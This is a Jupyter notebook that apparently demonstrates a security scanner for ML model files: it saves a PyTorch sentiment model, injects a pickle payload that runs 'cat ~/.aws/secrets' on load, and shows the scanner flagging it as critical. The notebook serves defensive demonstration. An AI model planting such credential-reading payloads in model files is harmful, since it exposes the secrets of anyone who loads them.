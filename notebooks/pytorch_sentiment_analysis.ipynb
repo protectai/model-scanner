{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Setup "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Installing modelscan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting modelscan\n",
      "  Obtaining dependency information for modelscan from https://files.pythonhosted.org/packages/bf/6e/dda8f775b53c307bd59042a7d20143b3f0d068e9b9c6776cf07a28ce208d/modelscan-0.1.1-py3-none-any.whl.metadata\n",
      "  Using cached modelscan-0.1.1-py3-none-any.whl.metadata (5.1 kB)\n",
      "Collecting click<9.0.0,>=8.1.3 (from modelscan)\n",
      "  Obtaining dependency information for click<9.0.0,>=8.1.3 from https://files.pythonhosted.org/packages/1a/70/e63223f8116931d365993d4a6b7ef653a4d920b41d03de7c59499962821f/click-8.1.6-py3-none-any.whl.metadata\n",
      "  Using cached click-8.1.6-py3-none-any.whl.metadata (3.0 kB)\n",
      "Collecting numpy==1.24.0 (from modelscan)\n",
      "  Using cached numpy-1.24.0-cp39-cp39-macosx_11_0_arm64.whl (13.9 MB)\n",
      "Collecting rich<14.0.0,>=13.4.2 (from modelscan)\n",
      "  Obtaining dependency information for rich<14.0.0,>=13.4.2 from https://files.pythonhosted.org/packages/8d/5f/21a93b2ec205f4b79853ff6e838e3c99064d5dbe85ec6b05967506f14af0/rich-13.5.2-py3-none-any.whl.metadata\n",
      "  Using cached rich-13.5.2-py3-none-any.whl.metadata (18 kB)\n",
      "Collecting markdown-it-py>=2.2.0 (from rich<14.0.0,>=13.4.2->modelscan)\n",
      "  Obtaining dependency information for markdown-it-py>=2.2.0 from https://files.pythonhosted.org/packages/42/d7/1ec15b46af6af88f19b8e5ffea08fa375d433c998b8a7639e76935c14f1f/markdown_it_py-3.0.0-py3-none-any.whl.metadata\n",
      "  Using cached markdown_it_py-3.0.0-py3-none-any.whl.metadata (6.9 kB)\n",
      "Requirement already satisfied: pygments<3.0.0,>=2.13.0 in /Users/mehrinkiani/mambaforge/envs/notebooks-pt/lib/python3.9/site-packages (from rich<14.0.0,>=13.4.2->modelscan) (2.15.1)\n",
      "Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich<14.0.0,>=13.4.2->modelscan)\n",
      "  Using cached mdurl-0.1.2-py3-none-any.whl (10.0 kB)\n",
      "Using cached modelscan-0.1.1-py3-none-any.whl (22 kB)\n",
      "Using cached click-8.1.6-py3-none-any.whl (97 kB)\n",
      "Using cached rich-13.5.2-py3-none-any.whl (239 kB)\n",
      "Using cached markdown_it_py-3.0.0-py3-none-any.whl (87 kB)\n",
      "Installing collected packages: numpy, mdurl, click, markdown-it-py, rich, modelscan\n",
      "Successfully installed click-8.1.6 markdown-it-py-3.0.0 mdurl-0.1.2 modelscan-0.1.1 numpy-1.24.0 rich-13.5.2\n"
     ]
    }
   ],
   "source": [
    "!pip install modelscan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install -q torch==2.0.1\n",
    "!pip install -q transformers==4.31.0\n",
    "!pip install -q scipy==1.11.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/mehrinkiani/mambaforge/envs/notebooks-pt/lib/python3.9/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TOKENIZERS_PARALLELISM=false\n"
     ]
    }
   ],
   "source": [
    "import torch\n",
    "import os \n",
    "from utils.pytorch_sentiment_model import download_model, predict_sentiment\n",
    "from utils.pickle_codeinjection import PickleInject, get_payload\n",
    "%env TOKENIZERS_PARALLELISM=false\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Saving Model\n",
    "\n",
    "\n",
    "The BERT based sentiment analysis PyTorch model used in the notebook can be found at https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment. The safe model is saved at `./PyTorchModels/safe_model.pt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save a model for sentiment analysis\n",
    "model_directory = \"PyTorchModels\"\n",
    "if not os.path.isdir(model_directory):\n",
    "    os.mkdir(model_directory)\n",
    "\n",
    "safe_model_path = os.path.join(model_directory, \"safe_model.pt\")\n",
    "\n",
    "sentiment_model = download_model(safe_model_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Safe Model Prediction"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The overall sentiment is: negative with a score of: 85.9%\n"
     ]
    }
   ],
   "source": [
    "sentiment = predict_sentiment(\"Stock market was bearish today\", torch.load(safe_model_path))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scan the Safe Model\n",
    "\n",
    "The scan results include information on the files scanned, and any issues if found. For the safe model scanned, modelscan finds no model serialization attacks, as expected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Scanning /Users/mehrinkiani/Documents/modelscan/notebooks/PyTorchModels/safe_model.pt:safe_model/data.pkl using pickle model scan\n",
      "\n",
      "\u001b[34m--- Summary ---\u001b[0m\n",
      "\n",
      "\u001b[32m No issues found! 🎉\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!modelscan --path PyTorchModels/safe_model.pt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Model Serialization Attack\n",
    "\n",
    "Here malicious code is injected in the safe model to read aws secret keys. The unsafe model is saved at `./PyTorchModels/unsafe_model.pt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "command = \"system\"\n",
    "malicious_code = \"\"\"cat ~/.aws/secrets\n",
    "    \"\"\"\n",
    "\n",
    "unsafe_model_path = os.path.join(model_directory, \"unsafe_model.pt\")\n",
    "\n",
    "\n",
    "payload = get_payload(command, malicious_code)\n",
    "torch.save(\n",
    "    torch.load(safe_model_path),\n",
    "    f=unsafe_model_path,\n",
    "    pickle_module=PickleInject([payload]),\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Unsafe Model Prediction\n",
    "\n",
    "The malicious code injected in the unsafe model gets executed when it is loaded. The aws secret keys are displayed. \n",
    "\n",
    "Also, the unsafe model predicts the sentiments just as well as safe model i.e., the code injection attack will not impact the model performance. The unaffected performance of unsafe models makes the ML models an effective attack vector. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aws_access_key_id=<access_key_id>\n",
      "aws_secret_access_key=<aws_secret_key>\n",
      "The overall sentiment is: negative with a score of: 85.9%\n"
     ]
    }
   ],
   "source": [
    "sentiment = predict_sentiment(\"Stock market was bearish today\", torch.load(unsafe_model_path))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scanning Unsafe Model\n",
    "\n",
    "The scan results include information on the files scanned, and any issues if found. In this case, a critical severity level issue is found in the unsafe model scanned. \n",
    "\n",
    "modelscan also outlines the found operator(s) and module(s) deemed unsafe. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Scanning /Users/mehrinkiani/Documents/modelscan/notebooks/PyTorchModels/unsafe_model.pt:unsafe_model/data.pkl using pickle model scan\n",
      "\n",
      "\u001b[34m--- Summary ---\u001b[0m\n",
      "\n",
      "Total Issues: \u001b[1;36m1\u001b[0m\n",
      "\n",
      "Total Issues By Severity:\n",
      "\n",
      "    - LOW: \u001b[1;32m0\u001b[0m\n",
      "    - MEDIUM: \u001b[1;32m0\u001b[0m\n",
      "    - HIGH: \u001b[1;32m0\u001b[0m\n",
      "    - CRITICAL: \u001b[1;36m1\u001b[0m\n",
      "\n",
      "\u001b[34m--- Issues by Severity ---\u001b[0m\n",
      "\n",
      "\u001b[34m--- CRITICAL ---\u001b[0m\n",
      "\n",
      "Unsafe operator found:\n",
      "  - Severity: CRITICAL\n",
      "  - Description: Use of unsafe operator 'system' from module 'posix'\n",
      "  - Source: /Users/mehrinkiani/Documents/modelscan/notebooks/PyTorchModels/unsafe_model.pt:unsafe_model/data.pkl\n"
     ]
    }
   ],
   "source": [
    "!modelscan --path  ./PyTorchModels/unsafe_model.pt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.16 ('notebooks-pt')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.16"
  },
  "vscode": {
   "interpreter": {
    "hash": "95ff33cfa0d19b4e14b9fe5f5453ae67cda9106db59c9cf5735c1bf946b2200c"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
